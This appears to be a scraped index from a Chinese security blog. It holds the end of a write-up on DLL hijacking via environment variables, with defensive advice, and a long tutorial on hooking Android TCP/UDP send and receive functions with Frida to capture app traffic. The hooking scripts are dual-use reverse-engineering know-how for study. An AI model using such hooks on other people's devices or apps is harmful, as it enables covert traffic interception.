API函数下断回溯,就会发现很多Windows内置Dll在使用环境变量来确定某些文件,如下: 我们自己写的程序或者模块可能会引用Windows系统Dll文件,但是Windows内部Dll文件大量引用环境变量,这会让我们的程序可能会受到此类Dll劫持手法的攻击.为了尽可能的减少风险,在编码时我们可以遵循以下规则: 程序代码使用GetWindowsDirectory代替环境变量\"%SystemRoot%\",或者使用GetSystemDirectory直接拿系统盘System32路径. 对系统Dll进行路径检测. 对程序加载的Dll进行签名校验. ","date":"2022-08-24","objectID":"/posts/windows%E7%9B%B8%E5%85%B3/dll%E5%8A%AB%E6%8C%81%E6%96%B0%E6%80%9D%E8%B7%AF-%E4%BF%AE%E6%94%B9%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F/:5:0","tags":["Windows"],"title":"DEFCON议题解读｜Dll劫持新思路——修改环境变量","uri":"/posts/windows%E7%9B%B8%E5%85%B3/dll%E5%8A%AB%E6%8C%81%E6%96%B0%E6%80%9D%E8%B7%AF-%E4%BF%AE%E6%94%B9%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F/"},{"categories":["Win相关"],"content":"总结 相对于传统Dll劫持利用Windows加载Dll时的搜索顺序,将恶意Dll存放在目标程序所在文件夹之下来完成Dll劫持.该方式可以保持目标程序所在文件夹的纯净度,可有效规避检测. “海量\"的Windows服务和内置进程均受环境变量的影响,这值得引起我们安全研究人员对环境变量的重视,以应对后面可能出现的此类攻击手法. ","date":"2022-08-24","objectID":"/posts/windows%E7%9B%B8%E5%85%B3/dll%E5%8A%AB%E6%8C%81%E6%96%B0%E6%80%9D%E8%B7%AF-%E4%BF%AE%E6%94%B9%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F/:6:0","tags":["Windows"],"title":"DEFCON议题解读｜Dll劫持新思路——修改环境变量","uri":"/posts/windows%E7%9B%B8%E5%85%B3/dll%E5%8A%AB%E6%8C%81%E6%96%B0%E6%80%9D%E8%B7%AF-%E4%BF%AE%E6%94%B9%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F/"},{"categories":["Win相关"],"content":"参考链接 Save the Environment (Variable) 环境变量 ","date":"2022-08-24","objectID":"/posts/windows%E7%9B%B8%E5%85%B3/dll%E5%8A%AB%E6%8C%81%E6%96%B0%E6%80%9D%E8%B7%AF-%E4%BF%AE%E6%94%B9%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F/:7:0","tags":["Windows"],"title":"DEFCON议题解读｜Dll劫持新思路——修改环境变量","uri":"/posts/windows%E7%9B%B8%E5%85%B3/dll%E5%8A%AB%E6%8C%81%E6%96%B0%E6%80%9D%E8%B7%AF-%E4%BF%AE%E6%94%B9%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F/"},{"categories":["Android 抓包"],"content":"概述 下述实验所基于的Android系统为Android8.1.0_r1,以传输层协议Tcp和Udp以及应用层加密协议Https为例,通过对其Java层和C层的调用链进行分析,以寻求Android系统框架层的最佳Hook点来拦截打印App收发包数据. ","date":"2022-07-12","objectID":"/posts/android/android%E6%8A%93%E5%8C%85/%E7%BD%91%E7%BB%9C%E9%80%9A%E8%AE%AF%E5%8D%8F%E8%AE%AE%E5%88%86%E6%9E%90/:1:0","tags":["抓包"],"title":"网络通讯协议分析","uri":"/posts/android/android%E6%8A%93%E5%8C%85/%E7%BD%91%E7%BB%9C%E9%80%9A%E8%AE%AF%E5%8D%8F%E8%AE%AE%E5%88%86%E6%9E%90/"},{"categories":["Android 抓包"],"content":"Tcp ","date":"2022-07-12","objectID":"/posts/android/android%E6%8A%93%E5%8C%85/%E7%BD%91%E7%BB%9C%E9%80%9A%E8%AE%AF%E5%8D%8F%E8%AE%AE%E5%88%86%E6%9E%90/:2:0","tags":["抓包"],"title":"网络通讯协议分析","uri":"/posts/android/android%E6%8A%93%E5%8C%85/%E7%BD%91%E7%BB%9C%E9%80%9A%E8%AE%AF%E5%8D%8F%E8%AE%AE%E5%88%86%E6%9E%90/"},{"categories":["Android 抓包"],"content":"服务端代码 import socket import threading IP = '0.0.0.0' PORT = 9999 def main(): server = socket.socket(socket.AF_INET, socket.SOCK_STREAM) server.bind((IP, PORT)) server.listen(5) print(f'[*] Listening on {IP}:{PORT}') while True: client, address = server.accept() print(f'[*] Accepted connection from {address[0]}:{address[1]}') client_handler = threading.Thread(target=handle_client, args=(client,)) client_handler.start() def handle_client(client_socket): with client_socket as sock: request = sock.recv(1024) print(f'[*] Received: {request.decode(\"utf-8\")}') sock.send(b'ACKKK') if __name__ == '__main__': main() ","date":"2022-07-12","objectID":"/posts/android/android%E6%8A%93%E5%8C%85/%E7%BD%91%E7%BB%9C%E9%80%9A%E8%AE%AF%E5%8D%8F%E8%AE%AE%E5%88%86%E6%9E%90/:2:1","tags":["抓包"],"title":"网络通讯协议分析","uri":"/posts/android/android%E6%8A%93%E5%8C%85/%E7%BD%91%E7%BB%9C%E9%80%9A%E8%AE%AF%E5%8D%8F%E8%AE%AE%E5%88%86%E6%9E%90/"},{"categories":["Android 抓包"],"content":"客户端代码 在AndroidManifest.xml文件赋予权限: \u003cuses-permission android:name=\"android.permission.INTERNET\"/\u003e MainActivity.java package com.example.luotcp; import androidx.appcompat.app.AppCompatActivity; import android.os.Bundle; import android.util.Log; import android.widget.TextView; import com.example.luotcp.databinding.ActivityMainBinding; import java.io.BufferedReader; import java.io.IOException; import java.io.InputStreamReader; import java.io.OutputStream; import java.net.Socket; public class MainActivity extends AppCompatActivity { static final String TAG = \"XiaLuoHun\"; // Used to load the 'luotcp' library on application startup. static { System.loadLibrary(\"luotcp\"); } private ActivityMainBinding binding; @Override protected void onCreate(Bundle savedInstanceState) { super.onCreate(savedInstanceState); binding = ActivityMainBinding.inflate(getLayoutInflater()); setContentView(binding.getRoot()); // Example of a call to a native method TextView tv = binding.sampleText; tv.setText(stringFromJNI()); new Thread(new Runnable() { @Override public void run() { try{ while (true){ DoTcp(\"10.67.16.180\", 9999); Thread.sleep(3000); } } catch(IOException | InterruptedException e){ e.printStackTrace(); } } }).start(); } public static void DoTcp(String strIP, int nPort) throws IOException, InterruptedException { Socket socket = new Socket(strIP, nPort); socket.setSoTimeout(10000); //发送数据给服务端 OutputStream outputStream = socket.getOutputStream(); outputStream.write(\"hello,server\".getBytes(\"UTF-8\")); Thread.sleep(2000); socket.shutdownOutput(); //读取数据 InputStream in = socket.getInputStream(); BufferedReader br = new BufferedReader(new InputStreamReader(in)); String line = br.readLine(); //打印读取到的数据 Log.d(TAG, \"tcp server recv:\" + line); br.close(); socket.close(); } /** * A native method that is implemented by the 'luotcp' native library, * which is packaged with this application. */ public native String stringFromJNI(); } 注意 如果是在本机跑服务端代码,手机端跑客户端代码,要保证客户端能够ping通服务端IP,如果ping不通,需要关闭下PC端的防火墙. ","date":"2022-07-12","objectID":"/posts/android/android%E6%8A%93%E5%8C%85/%E7%BD%91%E7%BB%9C%E9%80%9A%E8%AE%AF%E5%8D%8F%E8%AE%AE%E5%88%86%E6%9E%90/:2:2","tags":["抓包"],"title":"网络通讯协议分析","uri":"/posts/android/android%E6%8A%93%E5%8C%85/%E7%BD%91%E7%BB%9C%E9%80%9A%E8%AE%AF%E5%8D%8F%E8%AE%AE%E5%88%86%E6%9E%90/"},{"categories":["Android 抓包"],"content":"Java层抓包 观察上述开发流程,我们发现以下几个关键函数: Socket的构造函数,包含了要连接的IP和Port 发包函数,OutputStream.write() 收包函数,BufferedReader.readLine() 跟踪Socket构造函数 //http://androidxref.com/8.1.0_r33/xref/libcore/ojluni/src/main/java/java/net/Socket.java public Socket(String host, int port) -\u003eprivate Socket(InetAddress[] addresses, int port, SocketAddress localAddr,boolean stream) //http://androidxref.com/8.1.0_r33/xref/libcore/ojluni/src/main/java/java/net/InetSocketAddress.java -\u003epublic InetSocketAddress(InetAddress addr, int port) -\u003eprivate InetSocketAddressHolder(String hostname, InetAddress addr, int port) 到这里就找到了Socket构造函数最终调用的地方,至此可写出Hook代码如下: function hookSocketInit() { var Socket = Java.use('java.net.Socket') // Socket.$init.overload('java.lang.String', 'int').implementation = function (host, port) { // console.log('Host:', host, 'Port:', port) // return this.$init(host, port) // } // Socket.$init.overload('[Ljava.net.InetAddress;', 'int', 'java.net.SocketAddress', 'boolean').implementation = function (addresses, port, localAddr, stream) { // console.log('IP:', addresses[0].toString(), 'Port:', port) // return this.$init(addresses, port, localAddr, stream) // } var InetSocketAddressHolder = Java.use('java.net.InetSocketAddress$InetSocketAddressHolder') InetSocketAddressHolder.$init.overload('java.lang.String', 'java.net.InetAddress', 'int').implementation = function (hostname, addr, port) { console.log('IP:', addr.toString(), 'Port:', port) //console.log(Java.use(\"android.util.Log\").getStackTraceString(Java.use(\"java.lang.Throwable\").$new())); return this.$init(hostname, addr, port) } } function hookTcpJava() { Java.perform(function () { hookSocketInit() }) } setImmediate(hookTcpJava()) 跟踪发包函数 接下来跟踪OutputStream类的write函数. 首先注意到OutputStream是一个抽象类,需要找到它的具体实现类. 我们既可以通过源码级调试,确定OutputStream的具体实现类为java.net.SocketOutputStream 也可以利用下述Objection命令,确定OutputStream的具体实现类为java.net.SocketOutputStream objection.exe -g com.example.luotcp explore android hooking watch class_method java.net.Socket.getOutputStream --dump-args --dump-return --dump-backtrace 接下来跟踪SocketOutputStream类的write函数. //http://androidxref.com/8.1.0_r33/xref/libcore/ojluni/src/main/java/java/net/SocketOutputStream.java public void write(byte b[]) -\u003eprivate void socketWrite(byte b[], int off, int len) -\u003eprivate native void socketWrite0(FileDescriptor fd, byte[] b, int off,int len) 至此可写出Socket发包函数的Hook代码如下: function getAddrInfo(socket, isRead) { var src_addr = '' var src_port = '' var dst_addr = '' var dst_port = '' if (isRead) { src_addr = socket.getRemoteSocketAddress().toString().split(\":\")[0].split(\"/\").pop() src_port = socket.getRemoteSocketAddress().toString().split(\":\").pop() dst_addr = socket.getLocalAddress().toString().split(\":\")[0].split(\"/\").pop() dst_port = socket.getLocalPort().toString() } else { src_addr = socket.getLocalAddress().toString().split(\":\")[0].split(\"/\").pop() src_port = socket.getLocalPort().toString() dst_addr = socket.getRemoteSocketAddress().toString().split(\":\")[0].split(\"/\").pop() dst_port = socket.getRemoteSocketAddress().toString().split(\":\").pop() } return src_addr + ':' + src_port + ' --\u003e ' + dst_addr + ':' + dst_port } function hookWrite() { var SocketOutputStream = Java.use('java.net.SocketOutputStream') SocketOutputStream.socketWrite0.implementation = function (fd, b, off, len) { //打印数据包的源和目标地址 var socket = this.socket.value var msg = getAddrInfo(socket, false) console.log('socketWrite0', msg) //打印发包内容 var bufLen = len var ptr = Memory.alloc(bufLen); for (var i = 0; i \u003c bufLen; ++i) Memory.writeS8(ptr.add(i), b[off + i]); console.log(hexdump(ptr, { offset: 0, length: bufLen, header: false, ansi: false })); //打印调用栈 console.log(Java.use(\"android.util.Log\").getStackTraceString(Java.use(\"java.lang.Throwable\").$new())); return this.socketWrite0(fd, b, off, len) } } function hookTcpJava() { Java.perform(function () { hookWrite() }) } setImmediate(hookTcpJava()) 跟踪收包函数 接下来跟踪BufferedReader类的readLine函数. //http://androidxref.com/8.1.0_r33/xref/libcore/ojluni/src/main/java/jav","date":"2022-07-12","objectID":"/posts/android/android%E6%8A%93%E5%8C%85/%E7%BD%91%E7%BB%9C%E9%80%9A%E8%AE%AF%E5%8D%8F%E8%AE%AE%E5%88%86%E6%9E%90/:2:3","tags":["抓包"],"title":"网络通讯协议分析","uri":"/posts/android/android%E6%8A%93%E5%8C%85/%E7%BD%91%E7%BB%9C%E9%80%9A%E8%AE%AF%E5%8D%8F%E8%AE%AE%E5%88%86%E6%9E%90/"},{"categories":["Android 抓包"],"content":"Jni层抓包 在上面Java层抓包中,我们找到了Tcp Java层最深处的发包函数(socketWrite0)和收包函数(socketRead0),这里我们继续沿着这两个函数跟踪C层的调用链,以寻求最佳Hook点. 跟踪发包函数 //http://androidxref.com/8.1.0_r33/xref/libcore/ojluni/src/main/java/java/net/SocketOutputStream.java private native void socketWrite0(FileDescriptor fd, byte[] b, int off,int len) //http://androidxref.com/8.1.0_r33/xref/libcore/ojluni/src/main/native/SocketOutputStream.c SocketOutputStream_socketWrite0(JNIEnv *env, jobject this,jobject fdObj,jbyteArray data,jint off, jint len) //http://androidxref.com/8.1.0_r33/xref/libcore/ojluni/src/main/native/linux_close.cpp -\u003eint NET_Send(int s, void *msg, int len, unsigned int flags) 这里发现在Android源码中不太好跟踪,可通过下述命令进行搜索,查看在哪个so中,用IDA来看. adb shell su grep -ril NET_Send /system/lib64/* 最终发现NET_Send在libopenjdk.so中,通过下述命令将其导出. adb pull /system/lib64/libopenjdk.so 可以发现TCP发包在C层最终调用的是libc库中的sendto函数,至此可写出Hook代码如下: function getAddrInfo(sockfd, isRecv) { var message = {} var src_dst = [\"src\", \"dst\"] for (var i = 0; i \u003c src_dst.length; i++) { if ((src_dst[i] == \"src\") ^ isRecv) { var sockAddr = Socket.localAddress(sockfd) } else { var sockAddr = Socket.peerAddress(sockfd) } if (sockAddr == null) { // 网络超时or其他原因可能导致socket被关闭 message[src_dst[i] + \"_port\"] = 0 message[src_dst[i] + \"_addr\"] = 0 } else { message[src_dst[i] + \"_port\"] = (sockAddr.port \u0026 0xFFFF) message[src_dst[i] + \"_addr\"] = sockAddr.ip.split(\":\").pop() } } return message['src_addr'] + ':' + message['src_port'] + ' --\u003e ' + message['dst_addr'] + ':' + message['dst_port'] } function hookJniSend() { var sendto = Module.getExportByName(\"libc.so\", \"sendto\"); Interceptor.attach(sendto, { onEnter: function (args) { //打印数据包的源和目标地址 var sockfd = args[0].toInt32() var msg = getAddrInfo(sockfd, false) console.log('sendto', msg) //打印发包内容 var buf = ptr(args[1]).readCString(); var len = args[2].toInt32(); console.log(hexdump(args[1], { length: len })) //打印调用栈 console.log('sendto called from:\\n' + Thread.backtrace(this.context, Backtracer.FUZZY) .map(DebugSymbol.fromAddress).join('\\n') + '\\n') }, onLeave: function (retval) {} }) } function hookTcpJni() { /hookJniSend() } setImmediate(hookTcpJni()) 跟踪收包函数 //http://androidxref.com/8.1.0_r33/xref/libcore/ojluni/src/main/java/java/net/SocketInputStream.java private native int socketRead0(FileDescriptor fd,byte b[], int off, int len,int timeout) //http://androidxref.com/8.1.0_r33/xref/libcore/ojluni/src/main/native/SocketInputStream.c SocketInputStream_socketRead0(JNIEnv *env, jobject this,jobject fdObj, jbyteArray data,jint off, jint len, jint timeout) //http://androidxref.com/8.1.0_r33/xref/libcore/ojluni/src/main/native/linux_close.cpp -\u003eint NET_Read(int s, void* buf, size_t len) 这里同样在Android源码中不太好跟踪,同理用IDA打开libopenjdk.so库查看NET_Read函数. 可以发现Tcp收包在C层最终调用的是libc库中的recvfrom函数进行收包,至此可写出Hook代码如下: function getAddrInfo(sockfd, isRecv) { var message = {} var src_dst = [\"src\", \"dst\"] for (var i = 0; i \u003c src_dst.length; i++) { if ((src_dst[i] == \"src\") ^ isRecv) { var sockAddr = Socket.localAddress(sockfd) } else { var sockAddr = Socket.peerAddress(sockfd) } if (sockAddr == null) { // 网络超时or其他原因可能导致socket被关闭 message[src_dst[i] + \"_port\"] = 0 message[src_dst[i] + \"_addr\"] = 0 } else { message[src_dst[i] + \"_port\"] = (sockAddr.port \u0026 0xFFFF) message[src_dst[i] + \"_addr\"] = sockAddr.ip.split(\":\").pop() } } return message['src_addr'] + ':' + message['src_port'] + ' --\u003e ' + message['dst_addr'] + ':' + message['dst_port'] } function hookJniRecv() { var recvfrom = Module.getExportByName(\"libc.so\", \"recvfrom\"); Interceptor.attach(recvfrom, { onEnter: function (args) { this.fd = args[0]; this.buff = args[1]; this.size = args[2]; }, onLeave: function (retval) { var type = Socket.type(this.fd.toInt32()); if (retval \u003e 0 \u0026\u0026 type != null \u0026\u0026 type != 'unix:stream') { //打印数据包的源和目标地址 var sockfd = this.fd.toInt32() var msg = getAddrInfo(sockfd, true) console.log('recvfrom', msg) //打印收包内容 console.log(hexdump(this.buff, { length: retval.toInt32() })) //打印调用栈 console.log('recvfrom called from:\\n' + Thread.backtrace(this.contex","date":"2022-07-12","objectID":"/posts/android/android%E6%8A%93%E5%8C%85/%E7%BD%91%E7%BB%9C%E9%80%9A%E8%AE%AF%E5%8D%8F%E8%AE%AE%E5%88%86%E6%9E%90/:2:4","tags":["抓包"],"title":"网络通讯协议分析","uri":"/posts/android/android%E6%8A%93%E5%8C%85/%E7%BD%91%E7%BB%9C%E9%80%9A%E8%AE%AF%E5%8D%8F%E8%AE%AE%E5%88%86%E6%9E%90/"},{"categories":["Android 抓包"],"content":"Udp ","date":"2022-07-12","objectID":"/posts/android/android%E6%8A%93%E5%8C%85/%E7%BD%91%E7%BB%9C%E9%80%9A%E8%AE%AF%E5%8D%8F%E8%AE%AE%E5%88%86%E6%9E%90/:3:0","tags":["抓包"],"title":"网络通讯协议分析","uri":"/posts/android/android%E6%8A%93%E5%8C%85/%E7%BD%91%E7%BB%9C%E9%80%9A%E8%AE%AF%E5%8D%8F%E8%AE%AE%E5%88%86%E6%9E%90/"},{"categories":["Android 抓包"],"content":"服务端代码 import socket import threading IP = '0.0.0.0' PORT = 9997 def main(): server = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) server.bind((IP, PORT)) print(f'[*] bind on {IP}:{PORT}') while True: data, address = server.recvfrom(1024) print(f'[*] recvfrom connection from {address[0]}:{address[1]}') print(f'[*] Received: {data.decode(\"utf-8\")}') server.sendto(b'ACKKK', address) if __name__ == '__main__': main() ","date":"2022-07-12","objectID":"/posts/android/android%E6%8A%93%E5%8C%85/%E7%BD%91%E7%BB%9C%E9%80%9A%E8%AE%AF%E5%8D%8F%E8%AE%AE%E5%88%86%E6%9E%90/:3:1","tags":["抓包"],"title":"网络通讯协议分析","uri":"/posts/android/android%E6%8A%93%E5%8C%85/%E7%BD%91%E7%BB%9C%E9%80%9A%E8%AE%AF%E5%8D%8F%E8%AE%AE%E5%88%86%E6%9E%90/"},{"categories":["Android 抓包"],"content":"客户端代码 在AndroidManifest.xml文件赋予权限: \u003cuses-permission android:name=\"android.permission.INTERNET\"/\u003e MainActivity.java package com.example.luoudp; import androidx.appcompat.app.AppCompatActivity; import android.os.Bundle; import android.util.Log; import android.widget.TextView; import com.example.luoudp.databinding.ActivityMainBinding; import java.io.IOException; import java.net.DatagramPacket; import java.net.DatagramSocket; import java.net.InetAddress; import java.nio.charset.StandardCharsets; public class MainActivity extends AppCompatActivity { static final String TAG = \"XiaLuoHun\"; // Used to load the 'luoudp' library on application startup. static { System.loadLibrary(\"luoudp\"); } private ActivityMainBinding binding; @Override protected void onCreate(Bundle savedInstanceState) { super.onCreate(savedInstanceState); binding = ActivityMainBinding.inflate(getLayoutInflater()); setContentView(binding.getRoot()); // Example of a call to a native method TextView tv = binding.sampleText; tv.setText(stringFromJNI()); new Thread(new Runnable() { @Override public void run() { try{ while (true){ DoUdp(\"10.67.16.180\", 9997); Thread.sleep(3000); } } catch(IOException | InterruptedException e){ e.printStackTrace(); } } }).start(); } public static void DoUdp(String strIP, int nPort) throws IOException { DatagramSocket socket = new DatagramSocket(); //发送数据 DatagramPacket outPacket = new DatagramPacket(new byte[0], 0, InetAddress.getByName(strIP), nPort); outPacket.setData(\"hello,server\".getBytes(StandardCharsets.UTF_8)); socket.send(outPacket); //接收数据 byte[] inBuff = new byte[4096]; DatagramPacket inPacket = new DatagramPacket(inBuff, inBuff.length); socket.receive(inPacket); //打印读取到的数据 Log.d(TAG, new String(inBuff, 0, inPacket.getLength())); } /** * A native method that is implemented by the 'luoudp' native library, * which is packaged with this application. */ public native String stringFromJNI(); } ","date":"2022-07-12","objectID":"/posts/android/android%E6%8A%93%E5%8C%85/%E7%BD%91%E7%BB%9C%E9%80%9A%E8%AE%AF%E5%8D%8F%E8%AE%AE%E5%88%86%E6%9E%90/:3:2","tags":["抓包"],"title":"网络通讯协议分析","uri":"/posts/android/android%E6%8A%93%E5%8C%85/%E7%BD%91%E7%BB%9C%E9%80%9A%E8%AE%AF%E5%8D%8F%E8%AE%AE%E5%88%86%E6%9E%90/"},{"categories":["Android 抓包"],"content":"Java层抓包 观察上述开发流程,我们发现以下几个关键函数: DatagramPacket的构造函数,包含了要发送的IP和Port. 发包函数,DatagramSocket.send() 收包函数,DatagramSocket.receive() 跟踪DatagramPacket构造函数 //http://androidxref.com/8.1.0_r33/xref/libcore/ojluni/src/main/java/java/net/DatagramPacket.java public DatagramPacket(byte buf[], int offset, int length,InetAddress address, int port) -\u003epublic synchronized void setAddress(InetAddress iaddr) public synchronized void setPort(int iport) //发现IP和Port最终在DatagramPacket的address和Port变量中存储 接下来就可以写Hook代码了. function hookDatagramPacketInit() { var DatagramPacket = Java.use('java.net.DatagramPacket') DatagramPacket.$init.overload('[B', 'int', 'java.net.InetAddress', 'int').implementation = function (buf, length, address, port) { console.log('IP:', address.toString(), 'Port:', port) var result = this.$init(buf, length, address, port) //console.log('IP:', this.address.value.toString(), 'Port:', this.port.value) return result } } function hookUdpJava() { Java.perform(function () { hookDatagramPacketInit() }) } setImmediate(hookUdpJava()) 跟踪发包函数 这里跟踪的是DatagramSocket类的send函数. //http://androidxref.com/8.1.0_r33/xref/libcore/ojluni/src/main/java/java/net/DatagramSocket.java public void send(DatagramPacket p){ //--- //这里发现调用了一个抽象类的send方法,通过动态调试看堆栈调用,可以确定其具体实现类为PlainDatagramSocketImpl getImpl().send(p); //--- } //http://androidxref.com/8.1.0_r33/xref/libcore/ojluni/src/main/java/java/net/PlainDatagramSocketImpl.java -\u003eprotected void send(DatagramPacket p) //http://androidxref.com/8.1.0_r33/xref/libcore/luni/src/main/java/libcore/io/IoBridge.java -\u003epublic static int sendto(FileDescriptor fd, byte[] bytes, int byteOffset, int byteCount, int flags, InetAddress inetAddress, int port) //http://androidxref.com/8.1.0_r33/xref/libcore/luni/src/main/java/libcore/io/Linux.java -\u003epublic int sendto(FileDescriptor fd, byte[] bytes, int byteOffset, int byteCount, int flags, InetAddress inetAddress, int port) -\u003eprivate native int sendtoBytes(FileDescriptor fd, Object buffer, int byteOffset, int byteCount, int flags, InetAddress inetAddress, int port) private native int sendtoBytes(FileDescriptor fd, Object buffer, int byteOffset, int byteCount, int flags, SocketAddress address) 通过对Android源码的跟踪,可以发现Udp的发包函数最终调用的是Linux类的sendtoBytes这两个重载函数进行发包,至此可以写出Hook代码如下: function hookUdpSend() { var linux = Java.use(\"libcore.io.Linux\") linux.sendtoBytes.overload('java.io.FileDescriptor', 'java.lang.Object', 'int', 'int', 'int', 'java.net.InetAddress', 'int').implementation = function (fd, byteAry, byteOffset, byteCount, flags, inetAddress, port) { //打印数据包的源和目标地址 var sockname = this.getsockname(fd) //console.log('sockname', JSON.stringify(sockname)) var InetSocketAddressObj = Java.cast(sockname, Java.use(\"java.net.InetSocketAddress\")) var src_addr = InetSocketAddressObj.holder.value.addr.value.toString() var src_port = InetSocketAddressObj.holder.value.port.value var dst_addr = inetAddress.toString() var dst_port = port var msg = src_addr + ':' + src_port + ' --\u003e ' + dst_addr + ':' + dst_port console.log('sendtoBytes', msg) //打印发包内容 var b = Java.array(\"byte\", byteAry); var bufLen = byteCount var ptr = Memory.alloc(bufLen); for (var i = 0; i \u003c bufLen; ++i) Memory.writeS8(ptr.add(i), b[byteOffset + i]); console.log(hexdump(ptr, { offset: 0, length: bufLen, header: false, ansi: false })); //打印调用栈 console.log(Java.use(\"android.util.Log\").getStackTraceString(Java.use(\"java.lang.Throwable\").$new())) return this.sendtoBytes(fd, byteAry, byteOffset, byteCount, flags, inetAddress, port) } linux.sendtoBytes.overload('java.io.FileDescriptor', 'java.lang.Object', 'int', 'int', 'int', 'java.net.SocketAddress').implementation = function (fd, byteAry, byteOffset, byteCount, flags, address) { return this.sendtoBytes(fd, byteAry, byteOffset, byteCount, flags, address); } } function hookUdpJava() { Java.perform(function () { //hookDatagramPacketInit() hookUdpSend() }) } setImmediate(hookUdpJava()) 跟踪收包函数 这里跟踪的是DatagramSocket类的receive函数. //http://androidxref.com/8.1.0_r33/xref/libcore/ojluni/src/main/jav","date":"2022-07-12","objectID":"/posts/android/android%E6%8A%93%E5%8C%85/%E7%BD%91%E7%BB%9C%E9%80%9A%E8%AE%AF%E5%8D%8F%E8%AE%AE%E5%88%86%E6%9E%90/:3:3","tags":["抓包"],"title":"网络通讯协议分析","uri":"/posts/android/android%E6%8A%93%E5%8C%85/%E7%BD%91%E7%BB%9C%E9%80%9A%E8%AE%AF%E5%8D%8F%E8%AE%AE%E5%88%86%E6%9E%90/"},{"categories":["Android 抓包"],"content":"Jni层抓包 在上面Java层抓包中,我们找到了Udp Java层最深处的发包函数(sendtoBytes)和收包函数(recvfromBytes),这里我们继续沿着这两个函数跟踪C层的调用链,以寻求最佳Hook点. 跟踪发包函数 //http://androidxref.com/8.1.0_r33/xref/libcore/luni/src/main/native/libcore_io_Linux.cpp static jint Linux_sendtoBytes(JNIEnv* env, jobject, jobject javaFd, jobject javaBytes, jint byteOffset, jint byteCount, jint flags, jobject javaInetAddress, jint port) 这里发现在Android源码中不太好跟踪,又Linux_sendtoBytes这个函数并没有导出,通过下述命令进行搜索不太好使. adb shell su grep -ril Linux_sendtoBytes /system/lib64/* 那我们接下来该如何继续下去呢? 这里有3种方案: 猜测,我们在上面发现TCP发包在C层最终调用的是libc库中的sendto函数,那Udp是不是呢?(可以用上面Tcp的Jni Hook代码进行测试) 正向写一个C层的Udp发包代码示例,进行跟踪. 修改Android源码,将Linux_sendtoBytes函数导出,编译Android源码,将Linux_sendtoBytes所在的so导出,用IDA进行查看. 这里为了看清楚点,我选择了第3种方案,在Android源码libcore_io_Linux.cpp中新增一个Linux_sendtoBytes1函数并将其导出,重新编译Android源码,生成Android镜像并将其刷入手机中. //http://androidxref.com/8.1.0_r33/xref/libcore/luni/src/main/native/libcore_io_Linux.cpp extern \"C\" JNIEXPORT jint Linux_sendtoBytes1(JNIEnv* env, jobject, jobject javaFd, jobject javaBytes, jint byteOffset, jint byteCount, jint flags, jobject javaInetAddress, jint port) { ScopedBytesRO bytes(env, javaBytes); if (bytes.get() == NULL) { return -1; } return NET_IPV4_FALLBACK(env, ssize_t, sendto, javaFd, javaInetAddress, port, NULL_ADDR_OK, bytes.get() + byteOffset, byteCount, flags); } 通过搜索Linux_sendtoBytes1,发现在libjavacore.so中,将其导出用IDA进行查看. 从上面可以看到UDP发包在C层最终调用的也是libc库中的sendto函数,那这个跟Tcp发包底层调用的sendto有什么区别? 观察上面Tcp发包的sendto函数是直接将后两个参数(addr和addr_len)置0,而Udp则是将后两个参数填充为发包的目标IP和Port 再通过在IDA中查看libjavacore.so中的Linux_sendtoBytes1函数发现,在调用sendto之前调用了inetAddressToSockaddr函数进行地址转换,后续将其作为sendto函数的后两个参数传入. 接下来在Android源码中查看inetAddressToSockaddr函数做了什么. //http://androidxref.com/8.1.0_r33/xref/libcore/luni/src/main/native/NetworkUtilities.cpp bool inetAddressToSockaddr(JNIEnv* env, jobject inetAddress, int port, sockaddr_storage\u0026 ss, socklen_t\u0026 sa_len) { return inetAddressToSockaddr(env, inetAddress, port, ss, sa_len, true); } -\u003estatic bool inetAddressToSockaddr(JNIEnv* env, jobject inetAddress, int port, sockaddr_storage\u0026 ss, socklen_t\u0026 sa_len, bool map) 可以看到是由inetAddressToSockaddr的最后一个参数,决定是将Java层的IP和Port转换成了C层的结构体sockaddr_in还是sockaddr_in6 //大小为16 struct sockaddr_in { uint16 sin_family; /* Address family AF_INET */ uint16 sin_port; /* Port number. */ uint32 sin_addr.s_addr; /* Internet address. */ unsigned char sin_zero[8]; /* Pad to size of `struct sockaddr'. */ }; //大小为28 struct sockaddr_in6 { uint16 sin6_family; /* Address family AF_INET6 */ uint16 sin6_port; /* Transport layer port # */ uint32 sin6_flowinfo; /* IPv6 flow information */ uint8 sin6_addr[16]; /* IPv6 address */ uint32 sin6_scope_id; /* IPv6 scope-id */ }; 从Android源码来看,inetAddressToSockaddr的最后一个参数默认传了true,当然我们也可以来打印libc.so库中的sendto函数的后两个参数,来看究竟是将其转换成了上面哪个结构体. 从这里可以看到我们这个例子是将Java层的IP和Port转换成了C层的sockaddr_in6结构体,这样就得到了IP的格式,可以打印数据包的地址信息了,至此可写出Hook代码如下: function hookJniSend() { var sendto = Module.getExportByName(\"libc.so\", \"sendto\"); Interceptor.attach(sendto, { onEnter: function (args) { var fd = args[0].toInt32() var buf = args[1] var n = args[2] var flags = args[3] var addr = args[4] var addr_len = args[5].toInt32() //打印Udp sendto的后两个参数 // console.log(hexdump(addr, { // length: addr_len // })) // console.log('len', addr_len) //打印数据包的源和目标地址 var sockfd = fd var sockAddr = Socket.localAddress(sockfd) var src_addr = sockAddr.ip.split(\":\").pop() var src_port = (sockAddr.port \u0026 0xFFFF) //解析sockaddr_in6结构 var ipbase = ptr(addr).add(0x14); var dst_addr = ipbase.readU8() + \".\" + ipbase.add(1).readU8() + \".\" + ipbase.add(2).readU8() + \".\" + ipbase.add(3).readU8() var port_high = ptr(addr).add(2).readU8(); var port_low = ptr(addr).add(3).readU8(); var dst_port = port_high * 0x100 + port_low; var msg = src_addr + ':' + src_port + ' --\u003e ' + dst_addr + ':' + dst_port console.log('sendto', msg) //打印发包内容 var len = args[2].toInt32(); console.log(hexdump(buf, { length: len })) //打印调用栈 console.log('sendto called from:\\n' + Thread.backtrace(this.context, Backtracer.FUZZY) 